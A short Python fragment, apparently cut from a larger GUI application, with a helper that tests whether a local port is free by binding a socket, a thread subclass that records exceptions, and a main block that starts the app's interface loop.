def is_port_in_use(host, port):
    """Check if a port is in use."""
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        try:
            s.bind((host, port))
        except OSError:
            return True
    return False

    



class ExceptionThread(threading.Thread):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.exception = None

    def run(self):
        try:
            if self._target:
                self._target(*self._args, **self._kwargs)
        except Exception as e:
            self.exception = e
    
# ---------------------------------------------------------------------------- #


if __name__ == "__main__":

    app = interface.App()
    app.mainloop()